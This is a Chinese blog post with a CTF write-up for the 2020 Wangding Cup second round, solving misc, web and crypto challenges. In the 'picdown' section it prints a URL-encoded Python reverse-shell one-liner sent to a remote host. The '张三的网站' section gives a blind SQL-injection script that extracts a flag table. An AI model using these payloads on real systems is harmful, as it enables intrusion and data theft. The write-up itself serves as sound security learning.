<!DOCTYPE html>
<html lang="zh-CN">










<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="description" content="">
    <meta name="author" content="chuddy">
    <meta name="keywords" content="">
    <title>2020年网鼎杯第二场writeup ~ chuddy&#39;s Blog</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
    
        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
    
</head>

<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
<div class="container">
    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto text-center">
            
            <li class="nav-item">
                <a class="nav-link" href="/">Home</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/archives/">Archives</a>
            </li>
            
        </ul>
    </div>
</div>


</nav>
    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
    <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
        <div class="container text-center white-text wow fadeInUp">
            <p class="h2">2020年网鼎杯第二场writeup</p>
            <br>
            
            <p>Thursday, May 14th 2020, 10:27 pm</p>
            
        </div>
        </div>
    </div>
    </div>
  </header>

  <main>
  
  <div class="container-fluid">
    <div class="row">
        <div class="col-md-8 offset-md-2 ">
            <div class="post-content py-5 z-depth-3 main">
                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录下第二届网鼎杯白虎组的部分wp</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>打开页面发现是一个游戏界面，查看源代码中的js文件，发现了一个<code>ajax请求</code>：</p>
<pre><code>setTimeout(function () {
                if (n) {
                    return
                }
                if (e == l) {
                    var t = levelCount - 1;
                    if (t &gt; strings.ok.length - 1) {
                        t = strings.ok.length - 1
                    }
                    if(levelCount&gt;=7){
                        var token = prompt(&quot;please input your team Token:&quot;).trim();
                        $.ajax({
                            url: &#39;fate.php&#39;,
                            type: &#39;POST&#39;,
                            data: &#39;token=&#39; + token,
                            success: function(data){
                                var data = data;
                                alert(data);
                            }
                        })
                    }
                    o.innerHTML = strings.ok[t];
                    k()
                }
</code></pre><p>找到了url：<code>fate.php</code>向这个页面<code>post</code>传递一个<code>token</code>值，就可以得到<code>flag</code></p>
<p><img src="https://s1.ax1x.com/2020/05/14/YD4Pi9.png" alt="YD4Pi9.png"></p>
<h2 id="hack"><a href="#hack" class="headerlink" title="hack"></a>hack</h2><p>下载压缩包得到，压缩包中有<code>sqlmap1.4  0day.zip 和xor</code>。。。</p>
<p><img src="https://s1.ax1x.com/2020/05/14/YD4teS.png" alt="YD4teS.png"></p>
<p>发现文件是加密的。。尝试伪加密，发现不是未加密，，，</p>
<p>尝试爆破无果，唉，忽然想到会不会是明文攻击，<br>在网上下载一个<code>sqlmap-1.4</code>的文件，来进行明文攻击。。<br><img src="https://s1.ax1x.com/2020/05/14/YD76IS.png" alt="YD76IS.png"><br>得到了压缩包密码：</p>
<p>解压得到了<code>0day.zip和xor</code>文件<br><code>xor</code>想到可以利用<code>xortools</code>进行爆破：<br><img src="https://s1.ax1x.com/2020/05/15/YD7Oz9.png" alt="YD7Oz9.png"></p>
<p>得到了密钥<code>WDCTF</code>:</p>
<p>尝试对xor进行解密：</p>
<pre><code>#coding:utf-8

f = open(&#39;xor&#39;,&#39;rb&#39;)
w = open(&#39;xor1.png&#39;,&#39;ab&#39;)
line = f.read()
key = &#39;WDCTF&#39;
# print hex(ord(line[1]))
for i in range(len(line)):

    w.write(chr(ord(line[i])^ord(key[i % 5])))

</code></pre><p>得到了解密后的文件 用winhex打开：</p>
<p><img src="https://s1.ax1x.com/2020/05/15/YDHEQA.png" alt="YDHEQA.png"></p>
<p>得到了压缩包的密码：<code>qw91!25fzd$@!</code></p>
<p>解压得到flag文件<code>MZWGCZ33MY2DMODBGU2DCLJTGJSWKLJUMQZTOLLCHAZDKLJQMI4GCMRQGU2TQNJSGN6Q====</code></p>
<p>进行<code>base32</code>解密:</p>
<p><img src="https://s1.ax1x.com/2020/05/15/YDHMFS.png" alt="YDHMFS.png"></p>
<h2 id="hidden"><a href="#hidden" class="headerlink" title="hidden"></a>hidden</h2><p>打开压缩包，得到了一个图片：</p>
<p>winhex打开发现：</p>
<p><img src="https://s1.ax1x.com/2020/05/14/YDooyq.png" alt="YDooyq.png"></p>
<p>存在压缩包，用<code>binwalk</code>进行分离得到了一个压缩包：</p>
<p><img src="https://s1.ax1x.com/2020/05/14/YDoxp9.png" alt="YDoxp9.png"><br>进行爆破密码，成功爆破得到了密码：<br><img src="https://s1.ax1x.com/2020/05/14/YDTZpd.png" alt="YDTZpd.png"></p>
<p>得到了了一半的二维码，尝试修改高度：<br><img src="https://s1.ax1x.com/2020/05/14/YDT639.png" alt="YDT639.png"></p>
<p>将<code>43</code>修改为<code>85</code>，保存文件，得到了完整的二维码：<br>扫描得到<code>flag</code>。。。<br><img src="https://s1.ax1x.com/2020/05/14/YD7AbV.png" alt="YD7AbV.png"></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="picdown"><a href="#picdown" class="headerlink" title="picdown"></a>picdown</h2><p>打开题目，发现</p>
<p><img src="https://s1.ax1x.com/2020/05/14/YD6NOH.png" alt="YD6NOH.png"><br>是一个图片下载器。。。</p>
<p>猜测可以下载源码：</p>
<p>尝试之后，得到<code>main.py</code>的源码：</p>
<p><img src="https://s1.ax1x.com/2020/05/14/YD65t0.png" alt="YD65t0.png"></p>
<p><code>main.py</code>：</p>
<pre><code>from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = &quot;/tmp/secret.txt&quot;
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)


@app.route(&#39;/&#39;)
def index():
    return render_template(&#39;search.html&#39;)


@app.route(&#39;/page&#39;)
def page():
    url = request.args.get(&quot;url&quot;)
    try:
        if not url.lower().startswith(&quot;file&quot;):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype=&#39;application/octet-stream&#39;)
            response.headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=beautiful.jpg&#39;
            return response
        else:
            value = &quot;HACK ERROR!&quot;
    except:
        value = &quot;SOMETHING WRONG!&quot;
    return render_template(&#39;search.html&#39;, res=value)


@app.route(&#39;/no_one_know_the_manager&#39;)
def manager():
    key = request.args.get(&quot;key&quot;)
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get(&quot;shell&quot;)
        os.system(shell)
        res = &quot;ok&quot;
    else:
        res = &quot;Wrong Key!&quot;

    return res


if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;, port=8080)

</code></pre><p>漏洞代码：</p>
<pre><code>@app.route(&#39;/no_one_know_the_manager&#39;)
def manager():
    key = request.args.get(&quot;key&quot;)
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get(&quot;shell&quot;)
        os.system(shell)
        res = &quot;ok&quot;
    else:
        res = &quot;Wrong Key!&quot;

    return res
</code></pre><p>首先接受一个<code>key值</code>和<code>SECRET_KEY</code>相等，然后接受一个<code>shell值</code>，执行<code>os.system(shell)</code>这里可以反弹<code>shell</code>。</p>
<p>这里的<code>SECRET_KEY</code>是通过</p>
<pre><code>SECRET_FILE = &quot;/tmp/secret.txt&quot;
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)
</code></pre><p>这里读出来的，尝试读取这个<code>/tmp/secret.txt</code>文件，发现不能读取成功：<br><img src="https://s1.ax1x.com/2020/05/14/YDcGEn.png" alt="YDcGEn.png"><br>发现已经删除<code>os.remove(SECRET_FILE)</code>,忽然想起来以前出现过类似的考点：</p>
<p>在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用 <code>os.remove(SECRET_FILE)</code>）删除之后，在 <code>/proc</code> 这个进程的 pid 目录下的 <code>fd</code> 文件描述符目录下还是会有这个文件的 <code>fd</code>，通过这个我们即可得到被删除文件的内容。</p>
<p>尝试之后，在<code>/proc/self/fd/3</code>这里读取到<code>SECRET_FILE</code><br><img src="https://s1.ax1x.com/2020/05/14/YDcxbj.png" alt="YDcxbj.png"><br>然后进行<code>python</code>反弹<code>shell</code></p>
<p><code>/no_one_know_the_manager?key=reIqMCng8hfnu3wD4RDyKnO76LdgLeOYrb6DuPNLzLc=&amp;shell=python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22xx.xx.xx.xx%22,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27</code></p>
<p>可以成功反弹<code>shell</code>,最终在<code>/root/flag.txt</code>中得到<code>flag</code>:</p>
<p><img src="https://s1.ax1x.com/2020/05/14/YD2Rne.png" alt="YD2Rne.png"></p>
<p><code>flag{75a9190b-44a9-4f39-ba91-950743cbc18d}</code></p>
<h2 id="张三的网站"><a href="#张三的网站" class="headerlink" title="张三的网站"></a>张三的网站</h2><p>打开页面，发现是一个登陆页面，注册一个账号看看里面的功能：<br><img src="https://s1.ax1x.com/2020/05/14/YDRU8P.png" alt="YDRU8P.png"><br>登陆后发现：<br><img src="https://s1.ax1x.com/2020/05/14/YDRoVJ.png" alt="YDRoVJ.png"><br>页面只回显了用户名，忽然感觉这个题，有点熟悉的感觉了。。。</p>
<p>尝试注册用户名为<code>2&#39;+123+&#39;</code>，尝试登陆：<br><a href="https://imgchr.com/i/YDft6f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/14/YDft6f.png" alt="YDft6f.png"></a></p>
<p>这不是上一届网鼎杯的原题吗？</p>
<p>直接拿脚本改一改：</p>
<pre><code>import requests
import string
import re as r
import sys

reload(sys)
sys.setdefaultencoding(&quot;utf8&quot;)


url= &quot;http://906482149bf841c0b701c2f92bfaaa213b708f2173aa4e0b.cloudgame1.ichunqiu.com/&quot;


ch = &#39;0123456789qwertyuiopasdfghjklzxcvbnm{-}&#39;

re = requests.session()
flag = &#39;&#39;
for j in range(1,50):
    # payload = &quot;0&#39;+(select ascii(substr((database()) from  {} for {})))+&#39;0&quot;.format(int(j),1)
    payload = &quot;0&#39;+(select ascii(substr((select * from flag) from  {} for {})))+&#39;0&quot;.format(int(j),1)
    email = &#39;{}aaaa@qq.com&#39;.format(str(j)+&#39;kslaml&#39;)
    url1 = url+&#39;register.php&#39; 
    data = dict(email = email, username = payload,password = &#39;aaaa&#39;)
    res = re.post(url1,data=data)


    url2 = url+&#39;login.php&#39;
    data = dict(email = email,password = &#39;aaaa&#39;)
    html = re.post(url2, data=data)
    html.encoding = &#39;utf-8&#39;

    try:
        res = r.findall(r&#39;&lt;span class=&quot;user-name&quot;&gt;(.*?)&lt;/span&gt;&#39;,html.text,r.S)
        a = res[0][1:].strip()
        flag += chr(int(a))
        print flag
    except:
        pass

</code></pre><p>得到flag:<br><img src="https://s1.ax1x.com/2020/05/14/YDfccV.png" alt="YDfccV.png"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="b64"><a href="#b64" class="headerlink" title="b64"></a>b64</h2><p>题目给出：</p>
<pre><code>密文:uLdAuO8duojAFLEKjIgdpfGeZoELjJp9kSieuIsAjJ/LpSXDuCGduouz

泄露的密文:pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF=
泄露的明文:ashlkj!@sj1223%^&amp;*Sd4564sd879s5d12f231a46qwjkd12J;DJjl;LjL;KJ8729128713
</code></pre><p>对泄露的密文尝试base64解码，发现失败，对泄露的明文进行base64加密，发现正好和泄露的密文的长度相等。。。</p>
<pre><code>pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF=
YXNobGtqIUBzajEyMjMlXiYqU2Q0NTY0c2Q4NzlzNWQxMmYyMzFhNDZxd2prZDEySjtESmpsO0xqTDtLSjg3MjkxMjg3MTM=
</code></pre><p>于是可以猜测是换了码表</p>
<p>利用我们已知明文和对应密文来推算替换的码表，</p>
<p>我们将已知的明文进行base64加密，然后将加密的结果和密文进行一个对比：</p>
<pre><code>a= &#39;pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF=&#39;
b=&#39;YXNobGtqIUBzajEyMjMlXiYqU2Q0NTY0c2Q4NzlzNWQxMmYyMzFhNDZxd2prZDEySjtESmpsO0xqTDtLSjg3MjkxMjg3MTM=&#39;


list_a=[]
for i in a:
    list_a.append(i)


list_b=[]
for i in b:
    list_b.append(i)


nvs = zip(list_a,list_b)


def deleteDuplicate(li):
    temp_list = list(set([str(i) for i in li]))
    li=[eval(i) for i in temp_list]
    return li

print deleteDuplicate(nvs)
</code></pre><p>得到了如下的对应关系：</p>
<pre><code>[(&#39;d&#39;, &#39;x&#39;), (&#39;j&#39;, &#39;N&#39;), (&#39;8&#39;, &#39;s&#39;), (&#39;B&#39;, &#39;i&#39;), (&#39;k&#39;, &#39;O&#39;), (&#39;T&#39;, &#39;X&#39;), (&#39;H&#39;, &#39;B&#39;), (&#39;F&#39;, &#39;M&#39;), (&#39;9&#39;, &#39;t&#39;), (&#39;o&#39;, &#39;T&#39;), (&#39;M&#39;, &#39;o&#39;), (&#39;J&#39;, &#39;G&#39;), (&#39;W&#39;, &#39;q&#39;), (&#39;A&#39;, &#39;h&#39;), (&#39;p&#39;, &#39;Y&#39;), (&#39;Q&#39;, &#39;U&#39;), (&#39;q&#39;, &#39;c&#39;), (&#39;r&#39;, &#39;g&#39;), (&#39;u&#39;, &#39;Z&#39;), (&#39;v&#39;, &#39;a&#39;), (&#39;i&#39;, &#39;I&#39;), (&#39;D&#39;, &#39;k&#39;), (&#39;7&#39;, &#39;r&#39;), (&#39;N&#39;, &#39;p&#39;), (&#39;/&#39;, &#39;F&#39;), (&#39;K&#39;, &#39;l&#39;), (&#39;2&#39;, &#39;D&#39;), (&#39;e&#39;, &#39;y&#39;), (&#39;=&#39;, &#39;=&#39;), (&#39;g&#39;, &#39;0&#39;), (&#39;S&#39;, &#39;W&#39;), (&#39;n&#39;, &#39;S&#39;), (&#39;Z&#39;, &#39;L&#39;), (&#39;w&#39;, &#39;b&#39;), (&#39;O&#39;, &#39;3&#39;), (&#39;P&#39;, &#39;4&#39;), (&#39;C&#39;, &#39;j&#39;), (&#39;3&#39;, &#39;d&#39;), (&#39;m&#39;, &#39;Q&#39;), (&#39;f&#39;, &#39;z&#39;), (&#39;t&#39;, &#39;2&#39;), (&#39;L&#39;, &#39;m&#39;), (&#39;+&#39;, &#39;E&#39;)]
</code></pre><p>然后将密文中的字符进行替换， 对照发现还有几个字母的相对应的密文是未知的，分别是<code>E I X s G z</code></p>
<p>然后根据，flag是uuid的性质，推测出来几位，然后进行手工验证，得到了flag</p>
<p>感觉也是运气比较好，尝试了几次就出来了</p>
<p><code>flag{1e3a2de5-1c02-4f4f-9b2e-a4afabdf01e6}</code></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>打过网鼎杯，才知道自己有多菜了，，</p>
<p>大佬们tql…</p>
<p>还要努力呀。。。。</p>

                <hr>
                <div>
                    <p>
                         
                        <span class="badge badge-light">#&nbsp;writeup</span>
                        &nbsp;
                        
                    </p>
                </div>
                <br>
                
            </div>
        </div>
        <div class="d-none d-md-block col-md-2">
            
  <div id="toc" class="py-5">
    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
    <div id="tocbot"></div>
  </div>

        </div>
    </div>        
</div>

<br><br><br>

<!-- Comments -->
<div class="comments" id="comments">
 
</div>
  
  </main>

<footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
  </div>
</footer>

  <!-- SCRIPTS -->
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
  <script src="/js/main.js"></script>
  
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    
    <script src="/js/post.js"></script>
    
      <script src="/js/plugins/prettify.js"></script>
      <script>
          $(document).ready(function(){
              $('pre').addClass('prettyprint linenums');
              prettyPrint();
          })
      </script>
    
  
</body>
</html>